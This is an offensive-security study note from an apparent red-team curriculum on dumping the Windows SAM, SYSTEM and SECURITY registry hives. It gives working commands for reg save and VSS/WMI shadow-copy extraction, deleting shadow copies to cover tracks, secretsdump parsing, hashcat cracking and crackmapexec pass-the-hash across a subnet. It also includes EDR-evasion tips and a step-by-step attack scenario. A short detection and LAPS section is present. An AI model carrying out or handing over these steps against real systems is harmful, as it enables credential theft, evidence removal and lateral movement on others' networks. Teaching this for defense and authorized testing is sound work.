---
tags: [sam, registry, credential-dumping, local-admin]
difficulty: advanced
module: "36 - Active Directory Attacks"
topic: "36.22 SAM Hive Extraction"
---

# SAM Hive Extraction

## 1. Introduction to the SAM Database

The **Security Account Manager (SAM)** is a database file in Windows operating systems that stores user passwords. It is used to authenticate local users, meaning it holds the credentials for the local `Administrator` account, any created local users, and machine accounts. 

In a domain environment, domain user authentication is handled by the Domain Controller (Active Directory). However, every domain-joined machine still maintains a local SAM database. If an attacker can extract the NTLM hashes from the SAM database of a compromised workstation, they can often use the local `Administrator` hash to pivot laterally across the network, exploiting the common (though deeply flawed) administrative practice of using the same local Administrator password on multiple endpoints.

The SAM database is stored on disk at `C:\Windows\System32\config\SAM`. However, while the operating system is running, the Windows kernel places an exclusive lock on this file. It cannot be copied or read directly by any user, including the `SYSTEM` account. Attackers must use specific techniques to bypass this lock and extract the hashes.

---

## 2. The Dependency on SYSTEM and SECURITY Hives

Extracting just the SAM file is not enough. The hashes inside the SAM database are encrypted. To decrypt them, an attacker needs the **BootKey** (also known as the SysKey). 

The BootKey is a 16-byte key used to encrypt the SAM database and the LSA Secrets. It is dynamically generated and stored in the **SYSTEM** registry hive (`C:\Windows\System32\config\SYSTEM`). 

Additionally, the **SECURITY** registry hive (`C:\Windows\System32\config\SECURITY`) contains LSA Secrets, which can hold cached domain credentials, plaintext service account passwords, and DPAPI backup keys.

Therefore, a complete local credential extraction requires stealing all three hives:
1. `SAM`
2. `SYSTEM`
3. `SECURITY`

---

## 3. Visual Architecture: Extraction and Decryption Flow

```ascii
+-----------------------------------------------------------------------------------+
|                            COMPROMISED WINDOWS HOST                               |
|                                                                                   |
|  +-----------------------+                                                        |
|  | C:\Windows\System32\  |  <--- Locked by Kernel                                 |
|  | config\               |                                                        |
|  |                       |                                                        |
|  | - SAM                 |  -- (Bypass Lock via Reg Save or VSS) --+              |
|  | - SYSTEM              |  -- (Bypass Lock via Reg Save or VSS) --+              |
|  | - SECURITY            |  -- (Bypass Lock via Reg Save or VSS) --+              |
|  +-----------------------+                                         |              |
|                                                                    |              |
+--------------------------------------------------------------------|--------------+
                                                                     V
+-----------------------------------------------------------------------------------+
|                            ATTACKER MACHINE / OFFLINE PARSING                     |
|                                                                                   |
|  +-----------------+          +------------------+         +------------------+   |
|  |  SYSTEM Hive    | =======> | Extract BootKey  | =======>|                  |   |
|  +-----------------+          +------------------+         |                  |   |
|                                                            |    secretsdump   |   |
|  +-----------------+          +------------------+         |    (Impacket)    |   |
|  |  SAM Hive       | =======> | Extract Encrypted| =======>|                  |   |
|  +-----------------+          | NTLM Hashes      |         |                  |   |
|                               +------------------+         +--------+---------+   |
|                                                                     |             |
|                                                                     V             |
|                                                    [ Administrator:500:aad3b... ] |
|                                                    [ User1:1001:aad3b...        ] |
+-----------------------------------------------------------------------------------+
```

---

## 4. Extraction Techniques

To bypass the kernel lock on the registry files, attackers must have local Administrator privileges. 

### 4.1 The Registry Save Method
The simplest and most common method is leveraging the built-in `reg.exe` utility to save a copy of the registry hives directly from memory to a file. Because `reg.exe` operates through the Windows Configuration Manager API, it bypasses the file lock.

```cmd
# Execute in an elevated command prompt
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save
```
*OpSec Note: This method is highly signatured. EDRs actively monitor `reg.exe` commands containing `save` and `HKLM\SAM`.*

### 4.2 Volume Shadow Copy Service (VSS)
Windows uses VSS to create backup snapshots of volumes. Since a VSS snapshot is a point-in-time copy of the disk, the files within the snapshot are not locked by the OS. Attackers can create a shadow copy of the `C:` drive and copy the SAM, SYSTEM, and SECURITY files directly from it.

```cmd
# 1. Create a shadow copy
vssadmin create shadow /for=C:

# Output will provide a shadow copy volume name, e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# 2. Copy the files from the shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.save
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.save
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\security.save

# 3. Clean up the shadow copy to remove evidence
vssadmin delete shadows /for=C: /quiet
```
*OpSec Note: `vssadmin` is heavily monitored. Attackers may instead use WMI (`wmic shadowcopy call create`) or COM objects to interact with VSS more stealthily.*

### 4.3 Invoke-NinjaCopy
A PowerShell script from the PowerSploit framework that uses raw volume reads to bypass file locking APIs entirely. It opens a read handle to the raw `C:` volume (`\\.\C:`) and parses the NTFS structure manually to read the locked files. This bypasses API hooks looking for `reg.exe` or `vssadmin`.

### 4.4 Local Attack via Secretsdump
If the attacker has network access and local admin credentials (e.g., via a previously compromised hash), they can use Impacket's `secretsdump.py` to extract the hives remotely over SMB/RPC without dropping into a shell.
```bash
secretsdump.py corp.local/admin:Password123@192.168.1.100
```
This tool uploads a temporary service, binds to the remote registry or creates a VSS copy remotely, extracts the hashes, and cleans up automatically.

---

## 5. Offline Parsing and Exploitation

Once the `.save` files are exfiltrated to the attacker's machine, they must be parsed to extract the NTLM hashes.

### 5.1 Parsing with Impacket
Impacket's `secretsdump.py` has a local mode for offline extraction.
```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```
**Output Example:**
```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ITAdmin:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```
*(Note: `aad3b435b51404eeaad3b435b51404ee` is the blank LM hash. The second portion is the actual NTLM hash).*

### 5.2 Next Steps: Pass the Hash or Cracking
With the NTLM hash in hand, the attacker has two paths:
1. **Pass the Hash (PtH):** Use the hash directly with tools like CrackMapExec, Evil-WinRM, or Mimikatz to authenticate to other machines. If the `ITAdmin` local account shares the same password across the network, the attacker now owns all workstations.
2. **Offline Cracking:** Use Hashcat or John the Ripper to crack the NTLM hash and obtain the plaintext password.
```bash
hashcat -m 1000 hashes.txt rockyou.txt -r rules/dive.rule
```

---

## 6. Detection and Mitigation

### 6.1 Mitigation (LAPS)
The ultimate mitigation against SAM hive extraction leading to lateral movement is the **Local Administrator Password Solution (LAPS)**. LAPS automatically randomizes the local Administrator password on every domain-joined machine and rotates it frequently. If an attacker dumps the SAM on Workstation A, that hash will be useless on Workstation B.

### 6.2 Detections
- **Process CommandLine (Event ID 4688):** Look for `reg.exe` with arguments `save` and `HKLM\SAM` or `HKLM\SYSTEM`.
- **VSS Abuse (Event ID 4688):** Look for `vssadmin.exe create shadow` or `wmic shadowcopy`.
- **Service Creation (Event ID 7045):** Tools like remote `secretsdump.py` create a temporary service (often randomly named, but historically predictable) to execute the remote registry dump.
- **File System Monitoring (Event ID 11):** Monitor for the creation of files with `.save`, `.bak`, or `.hive` extensions in temp directories or user profiles.

---

## Real-World Attack Scenario

During a red team engagement, an attacker gained initial access to a corporate network by exploiting a vulnerability in a public-facing web application. This foothold provided them with a low-privileged shell on a DMZ web server. After performing local enumeration, the attacker discovered that they had local administrative privileges on the server because the IIS application pool identity was misconfigured to run as `SYSTEM`. The environment used Microsoft Defender for Endpoint (MDE), which heavily monitored LSASS access. Because of this, the attacker decided against LSASS dumping and opted for offline SAM hive extraction instead to obtain local Administrator credentials.

To bypass the OS kernel lock on the registry hives, the attacker needed a method that wouldn't immediately trigger an EDR alert. Standard `reg.exe save` commands are commonly signatured, so the attacker decided to leverage Volume Shadow Copy Service (VSS) using Windows Management Instrumentation (WMI), which often blends in better with legitimate administrative activity.

From their C2 beacon, the attacker executed:
```cmd
wmic shadowcopy call create Volume=C:\
```
The command successfully created a shadow copy and returned the ID: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`.

Next, the attacker copied the `SAM`, `SYSTEM`, and `SECURITY` hives from the shadow copy to a hidden directory:
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\sam.bak
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\sys.bak
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Temp\sec.bak
```

Once the files were copied, the attacker deleted the shadow copy to clean up their tracks:
```cmd
vssadmin delete shadows /for=C: /quiet
```

The attacker then downloaded `sam.bak`, `sys.bak`, and `sec.bak` to their local machine. Using Impacket's `secretsdump.py`, they parsed the extracted hives:
```bash
secretsdump.py -sam sam.bak -system sys.bak -security sec.bak LOCAL
```

The extraction yielded the NTLM hash of the local `Administrator` account. The target organization did not have LAPS deployed, meaning this same password was likely reused across multiple servers. The attacker immediately used CrackMapExec to perform a Pass-the-Hash attack across the internal subnet:
```bash
crackmapexec smb 10.10.50.0/24 -u Administrator -H <extracted_hash> --local-auth
```
This revealed that the identical local Administrator credential was valid on the primary internal database server, allowing the attacker to pivot deep into the network completely bypassing domain authentication controls.

## 7. Chaining Opportunities

- **[[12 - Pass the Hash and Overpass the Hash]]**: The NTLM hash retrieved from the SAM database is perfectly formatted for immediate PtH attacks against other endpoints.
- **[[21 - LSASS Dumping]]**: If LSASS memory is protected by Credential Guard, the SAM database becomes the primary fallback target for local privilege escalation and lateral movement.
- **[[20 - Mimikatz — Credential Dumping]]**: Mimikatz can also extract SAM hashes locally using the `lsadump::sam` command, combining the registry save and decrypt process into a single memory-resident action.

## 8. Related Notes
- [[21 - LSASS Dumping]]
- [[20 - Mimikatz — Credential Dumping]]
- [[12 - Pass the Hash and Overpass the Hash]]
